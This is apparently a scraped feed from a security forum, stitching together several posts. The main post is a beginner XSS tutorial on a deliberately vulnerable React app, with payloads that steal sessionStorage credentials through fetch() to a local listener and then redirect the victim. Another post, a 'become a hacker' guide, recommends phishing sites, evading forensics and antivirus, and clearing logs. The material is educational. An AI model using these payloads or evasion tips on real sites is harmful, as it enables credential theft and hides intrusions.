<h3><a name="p-42090-applying-dev-principles-10" class="anchor" href="https://d.clarkee.co.uk#p-42090-applying-dev-principles-10"></a>Applying dev principles</h3>
<p>One of the most useful principle I’ve used is to go as <em>slow</em> as possible. I could’ve shaved a few hours off from certain boxes, all I had to<br>
do is just to download a file, run it, <img src="https://d.clarkee.co.uk/images/emoji/twitter/dashing_away.png?v=15" title=":dashing_away:" class="emoji" alt=":dashing_away:" loading="lazy" width="20" height="20"> shell… but I didn’t.</p>
<p>If you go slower, you’ll find more things when enumerating, you’ll better understand the problems at hand, and you’ll have a better chance<br>
of remembering the things you’ve done, as opposed to just doing a quick hit and run. I think if you’re not having fun during these boxes, it might<br>
not be worth doing them anyway.</p>
<h2><a name="p-42090-closing-notes-11" class="anchor" href="https://d.clarkee.co.uk#p-42090-closing-notes-11"></a>Closing notes</h2>
<p>I really enjoyed learning so many new things and techniques,<br>
and I’m definitely looking forward to get better at boxes.</p>
<p>I’d like to thank all the people I’ve talked to<br>
in the last few weeks, they were all amazing and supportive people!</p>

          <title>My first attempt at XSS</title>
          <dc:creator><![CDATA[hacker_snail]]></dc:creator>
          <category>Beginner Guides</category>
          <description><![CDATA[
            <p>As some of you might know, I’m planning to document my journey coming from software development to infosec. This is the first post in the series, I’d be happy for you to give me your <em>honest</em> opinion.</p>
<p>So, as a developer, I’ve heard of <a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project" rel="noopener nofollow ugc">OWASP TOP 10</a>, let’s pick an example from there - XSS looks interesting and maybe I can create a simple app to break.</p>
<h3><a name="p-41766-what-is-xss-1" class="anchor" href="https://d.clarkee.co.uk#p-41766-what-is-xss-1"></a>What is XSS?</h3>
<p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" rel="noopener nofollow ugc">OWASP</a> says:</p>
<blockquote>
<p>Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.</p>
</blockquote>
<p>So the gist of it is that through a user input, it’s possible to embed code that can be executed, let’s try that.</p>
<p>I’ve learned that both React and Angular (two major players in the front-end framework scene at the time of writing this post)<br>
tries to protect against XSS out of the box, and as a developer you’ll have to explicitly trust content before allowing the browser to execute it without further sanitation.<br>
It makes the demonstration harder, but not impossible.</p>
<p>I’ve cooked up a React app that allows you to enter a URL and share it with someone else - let’s imagine that it makes sense, like it tracks who clicks, and who closes it without checking out your awesome fortnite videos. It’s a great way to tell who your <em>real</em> friends are™.</p>
<pre data-code-wrap="javascript"><code class="lang-javascript">import React from 'react';
import './App.css';

function login() {
  sessionStorage.setItem('auth', 'c25haWw6aHVudGVyMg==');
}

function getSharedUrl() {
  return window.location.hash.split('#')[1];
}

function App() {
  login();
  const sharedUrl = getSharedUrl();
  const defaultUrl = 'http://www.google.com';
  const [link, setLink] = React.useState(sharedUrl || defaultUrl);

  return (
    &lt;main className="main"&gt;
      &lt;h1&gt;Awesome Link Creator&lt;/h1&gt;
      {!!sharedUrl ?
        null :
        &lt;input
          type="text"
          value={link}
          onChange={event =&gt; setLink(event.target.value)}
        /&gt;
      }
      &lt;br/&gt;
      &lt;a href={link}&gt;My awesome link!&lt;/a&gt;
      &lt;br/&gt;
      &lt;p&gt;
        &lt;b&gt;Share it with your friends!&lt;/b&gt;
      &lt;/p&gt;
      &lt;span className="shareable-url"&gt;{window.location.origin}#{link}&lt;/span&gt;
    &lt;/main&gt;
  );
}

export default App;
</code></pre>
<p>If you’re not much into React or front-end development, here’s some explanation about the code above:</p>
<pre data-code-wrap="javascript"><code class="lang-javascript">/*
 This is called a React hook - without going into the details,
 this provides us a way of setting an initial value to the variable "link"
 and also gives us a programmatic way of setting its value
*/ 
const [link, setLink] = React.useState(sharedUrl || defaultUrl);
</code></pre>
<pre data-code-wrap="javascript"><code class="lang-javascript">/*
 We set the input's value to be "link" and 
 every time a change event is dispatched from the input
 we will set link to be equal to the current value of the input
 */
&lt;input
  type="text"
  value={link}
  onChange={event =&gt; setLink(event.target.value)}
/&gt;
</code></pre>
<pre data-code-wrap="javascript"><code class="lang-javascript">/*
 This will be the actual vulnerability here
 */
 &lt;a href={link}&gt;My awesome link!&lt;/a&gt;
</code></pre>
<p>Right, so we fire up our browser, and see a beautiful, carefully designed, UX award winning application:</p>
<p><span alt="a screenshot of an application with an input" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-link-slash svg-icon" aria-hidden="true"><use href="#link-slash"></use></svg></span></p>
<p>But how do we know if it’s vulnerable to XSS? The description of XSS mentions something like</p>
<blockquote>
<p>occur anywhere a web application uses input from a user</p>
</blockquote>
<p>Let’s try that then, but still, <em>how</em> would we know?<br>
It’s a common practice to call the javascript function <code>alert()</code> with any argument, like the number <code>1</code> - this will tell us if we can continue our research.<br>
If you look at the screenshot, you can see that there’s a shareable URL at the bottom of the page - with the app’s source code above, we know that it’ll generate a link with the user’s input.</p>
<p>That means we need a small addition to our <code>alert(1)</code> test, which is to tell the browser to execute it as javascript. We can achieve this by prefixing it with javascript, so the final input will be <code>javascript:alert(1)</code></p>
<p><span alt="application with an input of javascript:alert(1)" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-link-slash svg-icon" aria-hidden="true"><use href="#link-slash"></use></svg></span></p>
<p>And yes, if we click “My awesome link!”, we’ll see 1 in a popup.</p>
<p><span alt="javascript popup showing 1" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-link-slash svg-icon" aria-hidden="true"><use href="#link-slash"></use></svg></span></p>
<p>Now, this is good, we know there’s an XSS vulnerability on this page, we can wrap up, thanks for the atte… hold on…</p>
<p>A <a href="https://medium.com/@hakluke/upgrade-xss-from-medium-to-critical-cb96597b6cc4" rel="noopener nofollow ugc">brilliant read</a> by Luke Stephens points out that this doesn’t demonstrate well the severity of XSS in modern applications, and he’s right, so let’s see what else we can do.</p>
<p>It’s common practice to store some kind of data in either:</p>
<ul>
<li>cookies</li>
<li>local storage</li>
<li>session storage</li>
<li>memory</li>
</ul>
<p>Let’s see if we have any luck with the above, I’ll open up the developer console in my browser, and see if there’s anything</p>
<p><span alt="empty browser localstorage and some authentication in sessionStorage" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-link-slash svg-icon" aria-hidden="true"><use href="#link-slash"></use></svg></span></p>
<p>That <code>auth</code> seems useful, but it’s our own, and we most likely know our own credentials, so not very helpful.<br>
If we think a bit more, we realise that we can probably send a link to others, so we can access <strong>their</strong> credentials.</p>
<p>Let’s see how could we extract it - we know it’s stored in <code>sessionStorage</code>, so we can either write</p>
<pre data-code-wrap="javascript"><code class="lang-javascript">javascript:alert(window.sessionStorage.getItem('auth'));

// or we can just dump the whole object, maybe there's more for other users 

javascript:alert(Object.entries(window.sessionStorage))
</code></pre>
<p><span alt="popup with the contents of sessionStorage" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-link-slash svg-icon" aria-hidden="true"><use href="#link-slash"></use></svg></span></p>
<p>We’d still have to find a way to send this data to ourselves, and an alert is probably going to <em>literally alert</em> people. Let’s face it, it’s not very subtle.</p>
<p>I thought of firing up python’s <code>SimpleHttpServer</code> by issuing this command <code>python3 -m http.server</code> in my terminal.</p>
<p>Next thing is to make a request to it, that’ll leave us with something like</p>
<pre data-code-wrap="javascript"><code class="lang-javascript">javascript:fetch('http://localhost:8000?params=' + Object.entries(window.sessionStorage), {mode: 'no-cors'})
</code></pre>
<p>Almost there, but the link in the app wouldn’t work, so while it’s better than the above, it still wouldn’t go unnoticed, as users wouldn’t be redirected anywhere.</p>
<pre data-code-wrap="javascript"><code class="lang-javascript">javascript:fetch('http://localhost:8000?params=' + Object.entries(window.sessionStorage), {mode: 'no-cors'}).then(() =&gt; window.location.replace('http://facebook.com'))
</code></pre>
<p>Much better! We’ll use <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch" rel="noopener nofollow ugc"><code>fetch(url, options)</code></a> to initiate a request to our server (we could even post the data as the body, but a simple <code>GET</code> will do fine in this example), and once that’s finished, we’ll send the user away!</p>
<p><span alt="redirected to facebook with the request to our server" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-link-slash svg-icon" aria-hidden="true"><use href="#link-slash"></use></svg></span></p>
<p>As you can see above, we’ve been redirected, but the network tab shows that our request has been made first, and indeed</p>
<p><span alt="logs in terminal and base64 decoded user credentials" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-link-slash svg-icon" aria-hidden="true"><use href="#link-slash"></use></svg></span></p>
<p>we received the request containing the credentials.<br>
It’s common to use Base64 encoded string as the credentials (in the format of <code>user:password</code>) for Basic authentication headers, and whenever I see <code>=</code> at the end of a string, I always assume that it’s a Base64 encoded string, so let’s check if we can decrypt it (see above).<br>
We succeed, and we get a username and a password for that account.</p>
<p>Now we’ve gone from</p>
<blockquote>
<p>The app is vulnerable to XSS</p>
</blockquote>
<p>all the way to</p>
<blockquote>
<p>It’s possible to get all users’ credentials with a single link</p>
</blockquote>

          <category>Beginner Guides</category>
          <description><![CDATA[
            <p>Hello, 0x00’ers!</p>
<p>I am <a class="mention" href="https://d.clarkee.co.uk/u/bl4ckh47h4ck3r">@BL4CKH47H4CK3R</a> , My post is mainly for Beginners who have no idea about hacking &amp; wants to learn Linux to be a Hacker or Penetration Tester. Here I am telling you the exact proper ways to become a successful hacker</p>
<p>There are many useful resources on the internet to start with. But if you want to be a Hacker then you always need to gather the best knowledge</p>
<p>First, you will need some books to start with. But from my personal experience, there are many books in the market but all of them are not written in the reader’s perspective. Here I am giving some awesome books to learn Linux from scratch</p>
<p>Then you will need a perfect Linux OS to practice &amp; for penetration testing.<br>
Finally, you will need some Hacking Resources to start with</p>
<p>I am giving everything in this post so that users can start learning Linux &amp; be a Penetration Tester</p>
<h1>Books: →</h1>
<p><a href="http://linux-training.be/" rel="noopener nofollow ugc">Linux Training</a> from here download or read the books step by step and be sure to practice much because it will increase your skills.</p>
<p>Besides, you can read <a href="https://www.amazon.co.uk/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441?tag=0x00sec03-20" rel="noopener nofollow ugc">Hacking: The Art of Exploitation</a> &amp; <a href="https://www.amazon.co.uk/Penetration-Testing-Hands-Introduction-Hacking/dp/1593275641?tag=0x00sec03-20" rel="noopener nofollow ugc">Penetration Testing: A Hands-on Approach</a>. These two are also cool books.</p>
<h1>Operating System: →</h1>
<p><a href="https://parrotsec.org/download-security.php" rel="noopener nofollow ugc">Parrot KDE Security</a>, from my experience I will tell you to use Parrot OS. Kali Linux is also very popular but probably not for beginners.</p>
<p>See differences <a href="https://www.youtube.com/watch?v=I3IXZhz0SZA" rel="noopener nofollow ugc">Kali Linux VS Parrot OS</a></p>
<h1>Programming Knowledge: →</h1>
<p>For becoming a Hacker you should have learned at least (9-10) Programming languages and master of them.</p>
<p>Programming it is the toughest things but interesting (It’s funny when Bill Gates, Mark Zuckerberg &amp; others saying it’s very easy to show them off). It is a matter of sorrow that people want to become a hacker without learning a single programming language</p>
<p>It will be better if you can master these: →</p>
<ol>
<li>Python (Very Popular &amp; Easy To Learn) (Big Importance In Hacking)</li>
<li>Shell Programming Language</li>
<li>C/C++</li>
<li>Java</li>
<li>HTML5, PHP, CSS (Not Programming Language)</li>
<li>Ruby</li>
<li>JavaScript</li>
<li>
<a href="https://en.wikibooks.org/wiki/Windows_Batch_Scripting" rel="noopener nofollow ugc">Windows Batch Scripting</a> &amp; PowerShell</li>
</ol>
<p>Besides, there are also some modern programming languages like Cython Jython and so on (These are for advanced purpose)</p>
<p>If I am going to explain every single thing then the list will be increasing &amp; won’t for a people learning from scratch <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:"></p>
<h1>Skills: →</h1>
<p>It’s really a hard task to become a hacker. You will need some skills to become a successful hacker.</p>
<p>There are some mandatory skills to become a hacker. Without these, you are not considered to be a hacker.</p>
<h3>Fundamental Skills: →</h3>
<p>These are the basics that every hacker should know before even trying to hack. Once you have a good grasp on everything in this section, you can move into the intermediary level.</p>
<h3>1. Basic Computer Skills:</h3>
<p>It probably goes without saying that to become a hacker you need some basic computer skills. These skills go beyond the ability to create a Word document or cruise the Internet. You need to be able to use the command line in Windows, edit the registry, and set up your networking parameters.</p>
<p>Many of these basic skills can be acquired in a basic computer skills course like A+.</p>
<h3>2. Networking Skills:</h3>
<p>You need to understand the basics of networking, such as the following.</p>
<ul>
<li>DHCP</li>
<li>NAT</li>
<li>Subnetting</li>
<li>IPv4</li>
<li>IPv6</li>
<li>Public vs Private IP</li>
<li>DNS</li>
<li>Routers and switches</li>
<li>VLANs</li>
<li>OSI model</li>
<li>MAC addressing</li>
<li>ARP</li>
</ul>
<p>As we are often exploiting these technologies, the better you understand how they work, the more successful you will be. Note that I did not write the two guides below, but they are very informative and cover some of the networking basics mentioned above.</p>
<ul>

</ul>
<h3>3. Linux Skills:</h3>
<p>It is extremely critical to develop Linux skills to become a hacker. Nearly all the tools we use as a hacker are developed for Linux and Linux gives us capabilities that we don’t have using Windows.</p>
<p>If you need to improve your Linux skills, or you’re just getting started with Linux, check out Linux series for beginners below.</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/linux-basics/" rel="noopener nofollow ugc">Linux Basics for the Aspiring Hacker</a></li>
</ul>
<h3>4. Wireshark or Tcpdump:</h3>
<p>Wireshark is the most widely used sniffer/protocol analyzer, while tcpdump is a command line sniffer/protocol analyzer. Both can be extraordinarily useful in analyzing TCP/IP traffic and attacks.</p>
<ul>

</ul>
<h3>5. Virtualization:</h3>
<p>You need to become proficient in using one of the virtualization software packages such as <a href="https://www.virtualbox.org/" rel="noopener nofollow ugc">VirtualBox</a> or <a href="http://www.vmware.com/products/workstation" rel="noopener nofollow ugc">VMWare Workstation</a>. Ideally, you need a safe environment to practice your hacks before you take them out in the real world. A virtual environment provides you a safe environment to test and refine your hacks before going live with them.</p>
<h3>6. Security Concepts &amp; Technologies:</h3>
<p>A good hacker understands security concepts and technologies. The only way to overcome the roadblocks established by the security admins is to be familiar with them. The hacker must understand such things as PKI (public key infrastructure), SSL (secure sockets layer), IDS (intrusion detection system), firewalls, etc.</p>
<p>The beginner hacker can acquire many of these skills in a basic security course such as Security+.</p>
<ul>
<li><a href="https://null-byte.wonderhowto.com/how-to/snort/" rel="noopener nofollow ugc">How to Read &amp; Write Snort Rules to Evade an IDS</a></li>
</ul>
<h3>7. Wireless Technologies:</h3>
<p>In order to be able to hack wireless, you must first understand how it works. Things like the encryption algorithms (WEP, WPA, WPA2), the four-way handshake, and WPS. In addition, understanding such as things as the protocol for connection and authentication and the legal constraints on wireless technologies.</p>
<p>To get started, check out the guide below on getting started with wireless terms and technologies, then read our collection of Wi-Fi hacking guides for further information on each kind of encryption algorithms and for examples of how each hack works.</p>

<h3>Intermediate Skills: →</h3>
<p>This is where things get interesting, and where you really start to get a feel for your capabilities as a hacker. Knowing all of these will allow you to advance to more intuitive hacks where you are calling all the shots—not some other hacker.</p>
<h3>1. Scripting:</h3>
<p>Without <a href="https://null-byte.wonderhowto.com/how-to/scripting/" rel="noopener nofollow ugc">Scripting Skills</a>, the hacker will be relegated to using other hackers’ tools. This limits your effectiveness. Every day a new tool is in existence loses effectiveness as security admins come up with defenses.</p>
<p>To develop your own unique tools, you will need to become proficient at least in one of the scripting languages including the BASH shell. These should include one of Perl, Python, or Ruby.</p>

</ul>
<h3>2. Database Skills:</h3>
<p>If you want to be able to proficiently <a href="https://null-byte.wonderhowto.com/how-to/db-hacking/" rel="noopener nofollow ugc">Hack Databases</a>, you will need to understand databases and how they work. This includes the SQL language. I would also recommend the mastery of one of the major DBMS’s such SQL Server, Oracle, or MySQL.</p>

</ul>
<h3>3. Web Applications:</h3>
<p>Web applications are probably the most fertile ground for hackers in recent years. The more you understand about how web applications work and the databases behind them, the more successful you will be. In addition, you will likely need to build your own website for phishing and other nefarious purposes.</p>

</ul>
<h3>4. Forensics:</h3>
<p>To become a good hacker, you must not be caught! You can’t become a pro hacker sitting in a prison cell for 5 years. The more you know about <a href="https://null-byte.wonderhowto.com/how-to/forensics/" rel="noopener nofollow ugc">Digital Forensics</a>, the better you can become at avoiding and evading detection.</p>

</ul>
<h3>12. Advanced TCP/IP:</h3>
<p>The beginner hacker must understand TCP/IP basics, but to rise to the intermediate level, you must understand in intimate details the TCP/IP protocol stack and fields. These include how each of the fields (flags, window, df, tos, seq, ack, etc.) in both the TCP and IP packet can be manipulated and used against the victim system to enable MITM attacks, among other things.</p>
<h3>13. Cryptography:</h3>
<p>Although one doesn’t need to be a cryptographer to be a good hacker, the more you understand the strengths and weaknesses of each cryptographic algorithm, the better the chances of defeating it. In addition, cryptography can be used by the hacker to hide their activities and evade detection.</p>
<h3>14. Reverse Engineering:</h3>
<p>Reverse engineering enables you to open a piece of malware and re-build it with additional features and capabilities. Just like in software engineering, no one builds a new application from scratch. Nearly every new exploit or malware uses components from other existing malware.</p>
<p>In addition, reverse engineering enables the hacker to take an existing exploit and change its signature so that it can fly past IDS and <a href="https://null-byte.wonderhowto.com/how-to/evading-av-software/" rel="noopener nofollow ugc">AV Detection</a>.</p>

</ul>
<h3>Intangible Skills: →</h3>
<p>Along with all these computer skills, successful hacker must have some intangible skills. These include the following.</p>
<h3>1. Think Creatively:</h3>
<p>There is ALWAYS a way to hack a system and many ways to accomplish it. A good hacker can think creatively of multiple approaches to the same hack.</p>

</ul>
<h3>2. Problem-Solving Skills:</h3>
<p>A hacker is always coming up against seemingly unsolvable problems. This requires that the hacker be accustomed to thinking analytically and solving problems. This often demands that the hacker diagnose accurately what is wrong and then break the problem down into separate components. This is one of those abilities that comes with many hours of practice.</p>

<li><a href="https://null-byte.wonderhowto.com/forum/problem-solving-is-essential-hacker-skill-0150882/" rel="noopener nofollow ugc">Problem Solving Is an Essential Hacker Skill</a></li>
</ul>
<h3>3. Persistence:</h3>
<p>A hacker must be persistent. If you fail at first, try again. If that fails, come up with a new approach and try again. It is only with a persistence that you will be able to hack the most secure systems.</p>

</ul>
<p>I hope this gives you some guidelines as to what one needs to study and master to ascend to the intermediate level of hacking. In a future article, I’ll discuss what you need to master to ascend into the advanced or master hacker level, so keep coming back, my novice hackers!</p>
<h1>Phases Of Hacking: →</h1>
<p>There are mainly Five Phases in hacking<br>
Not necessarily a hacker has to follow these five steps in a sequential manner. It’s a stepwise process and when followed yields a better result.</p>
<h3>1. Reconnaissance:</h3>
<p>This is the first step of Hacking. It is also called as Footprinting and information gathering  Phase. This is the preparatory phase where we collect as much information as possible about the target. We usually collect information about three groups,</p>
<ol>
<li>Network</li>
<li>Host</li>
<li>People involved</li>
</ol>
<p>There are two types of Footprinting:</p>
<ul>
<li>
<strong>Active:</strong>  Directly interacting with the target to gather information about the target. Eg Using Nmap tool to scan the target</li>
<li>
<strong>Passive:</strong>  Trying to collect information about the target without directly accessing the target. This involves collecting information from social media, public websites, etc.</li>
</ul>
<h3>2. Scanning:</h3>
<p>Three types of scanning are involved:</p>
<ul>
<li>
<strong>Port scanning:</strong>  This phase involves scanning the target for the information like open ports, Live systems, various services running on the host.</li>
<li>
<strong>Vulnerability Scanning:</strong>  Checking the target for weaknesses or vulnerabilities which can be exploited. Usually done with the help of automated tools</li>
<li>
<strong>Network Mapping:</strong>  Finding the topology of the network, routers, firewalls servers if any, and host information and drawing a network diagram with the available information. This map may serve as a valuable piece of information throughout the haking process.</li>
</ul>
<h3>3. Gaining Access:</h3>
<p>This phase is where an attacker breaks into the system/network using various tools or methods. After entering into a system, he has to increase his privilege to administrator level so he can install an application he needs or modify data or hide data.</p>
<h3>4. Maintaining Access:</h3>
<p>Hacker may just hack the system to show it was vulnerable or he can be so mischievous that he wants to maintain or persist the connection in the background without the knowledge of the user. This can be done using Trojans, Rootkits or other malicious files. The aim is to maintain access to the target until he finishes the tasks he planned to accomplish in that target.</p>
<h3>5. Clearing Track:</h3>
<p>No thief wants to get caught. An intelligent hacker always clears all evidence so that in the later point of time, no one will find any traces leading to him. This involves modifying/corrupting/deleting the values of Logs, modifying registry values and uninstalling all applications he used and deleting all folders he created.</p>
<h1>Hacking Resources: →</h1>
<p>At first, I will tell you that the Pentesing OS you will use as much and more penetration testing tools for various types of Hacking<br>
But did you notice that maximum tools were taken from GitHub ???</p>
<p>Yes, from GitHub !!!<br>
So here I am giving you a curated list of nice resources from GitHub to start hacking<br>
Don’t awesome resources here <a href="https://github.com/trimstray/the-book-of-secret-knowledge" rel="noopener nofollow ugc">The Book Of Secret Knowledge</a></p>
<p>Also, don’t forget to check out Awesome Hacking related <a href="https://0x00sec.org/t/services-tools-wiki/2123">Services &amp; Tools [Wiki]</a> from my friend <a class="mention" href="https://d.clarkee.co.uk/u/pry0cc">@pry0cc</a> to learn about various tools &amp; their works</p>
<p>Besides, try to find other hacking tools and their manuals in GitHub (If possible join open-source software development programs)</p>
<h1>Practicing The Stuff: →</h1>
<p>Really practice makes a man perfect. You have to practice more and more to enrich your skills in this hacking field. For this, you can at first target your own machines (Not The Host Computer). Try to find the vulnerabilities &amp; try to gain access</p>
<p>There are many websites on the internet to practice your hacking skills like <a href="https://www.hackthebox.eu/" rel="noopener nofollow ugc">HackTheBox</a> for testing your hacking skills &amp; do some CTF. Some are hosted on our website (This website). Try to solve the problems &amp; find the answer. If you are continuously failing then you have to practice more &amp; then you will be able to solve the problem</p>
<h1>At Last: →</h1>
<p>People laughed when I say Google &amp; TOR is your best friend<br>
for gathering skills to become a hacker</p>
<p>Just search the things with exact name &amp; purposes then you will get it (Knowledge is free but it depends on how you use that)</p>
<p>Try to learn from hints and try to analyze them. Besides, for becoming a Successful Hacker you should have to learn more and more programming languages. At least which I have mentioned (Not telling you to learn every syntax &amp; every use of these programming languages)</p>
<p>I really a hard task for becoming a Hacker. People really fails in this learning section as they can’t continue their continuous learning &amp; self-assessment process.</p>
<p>Hacking — is a much-exploited arena of information technology &amp; security. It has now become a billion dollar industry. Media are another game-changers to promote so-called hackers and such hackers become an idol for newcomers and cyber security training industry exploits them.</p>
<p>In the mid-80s &amp; 90s, hacking was termed as programming subculture of the developers’ community. But later it was disguised by the moron media people who little understand hacking, and technology behind the security.</p>
<p><strong>Media falsely related hacking to cybercrime. Some moron then started using a much pretty word — ethical to precede hacking and it’s become</strong>  <em><strong>Ethical Hacking.</strong></em>  <strong>Simply ridiculous.</strong></p>
<p>There’s a mushroom growth of cybersecurity training since a couple of years. Most of them are just fake. And innocent young people who think cybersecurity is a demanding field of computer science, are aspiring to become a hacker.</p>
<p>No one can become a hacker by such street courses like CEH. Nor one can become a successful hacker (LOL!) by two or three-year nonsense graduate or diploma courses. To become a successful security expert requires lots of sweating hours to study and many sleepless nights to become well-versed with many systems.</p>
<p>People who cannot cope-up with CLI should simply get away from the information security field. Also, system scripting languages like bash, csh, sh, perl, python are required to write your own code to deal with systems and to talk with the network. By using the mere tool available in Kali Linux or using Metasploit etc., not means you are a good security expert or so-called hacker.</p>
<p>I often see the question on Quora asking I’m stuck with CLI or something like that in Kali Linux or any such Linux distribution are also aspirant hackers. This is like swimming in the deep sea after one or two-day training course of swimming.</p>
<p>Cybersecurity is a matter of own experience to deal with vulnerabilities &amp; threats. I witnessed many students who successfully completed hacking courses like CEH and still struggle to escape if stuck in simple Linux gotcha.</p>
<p>So-called  <em><strong>Ethical Hacking</strong></em> is a nonsense thing in cybersecurity. Do you really think you would really be wanted to be a  <em>sheeple?</em></p>
<p>Everyone just wants easy success. But believe me for becoming a Successful Hacker it really takes years &amp; a great sacrifice to become a Pro</p>
<p>Practicing more and more will really help you do that. So It’s your choice that what types of hacker you want to be (BlackHat, GreyHat, WhiteHat) really depends upon your choice &amp; works.</p>
<p>Think that you have got your answer <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:"></p>

          <title>Stack based buffer overflows... still relevant?</title>

            <p>Hey guys, newbie here.<br>
In your opinion, is studying stack based buffer overflows still relevant nowadays? I mean with stack protection compilation by default, and other memory security measures in modern Linux and Windows systems?<br>
Do you know if this kind of vulnerabilities are still being developed and exploited “in the wild” ?<br>
Thank for answering,</p>
<p>Regards</p>

            <p>Hey there! First post, finally! <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p>First of all, thanks to “W” (calling him W just in case he doesn’t want his ‘name’ revealed) and to Leeky for the help! My poster looked like a mess before they helped me &lt;333</p>
<p>I was studying Doug Lea’s malloc() vulnerability and, to keep track of some concepts, I wrote them down and ended up with tables and flowcharts.<br>
Seeing it was pretty helpful to me and also kinda cute, I redid it in a poster format to put it up so I can remember that stuff.</p>
<p>I’m sharing the pic I did with you so maybe it’s useful in case you are learning about dlmalloc, you want to or simply because you like it (hopefully!).</p>
<p>Adding a link to a tweet I made with an image in PNG format: <a href="https://twitter.com/eightytank/status/1067174846986108928" rel="noopener nofollow ugc">https://twitter.com/eightytank/status/1067174846986108928</a> Just in case you’re feeling like giving me love today.<br>
Also, it’s in my tweet too but adding it here. My blog post about it with the image in GIF format: <a href="https://hackingsquid.blogspot.com/2018/11/poster-doug-leas-malloc-cheatsheet-heap.html" rel="noopener nofollow ugc">https://hackingsquid.blogspot.com/2018/11/poster-doug-leas-malloc-cheatsheet-heap.html</a> There are a tad more of details there, like references and stuff.</p>
<p>If you happen to find some concept that’s wrong, please send me a message and let me know so I can edit! Thanks a lot <img src="https://0x00sec.org/images/emoji/twitter/relaxed.png?v=9" title=":relaxed:" class="emoji" alt=":relaxed:"><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5a9b809ad9b84ccf19987bfa163b749b186ca0c1.png" alt="HeapOverflow" data-base62-sha1="cVy8lsOXGDjffRDDMkIbAuDNAiJ" width="689" height="462"></p>
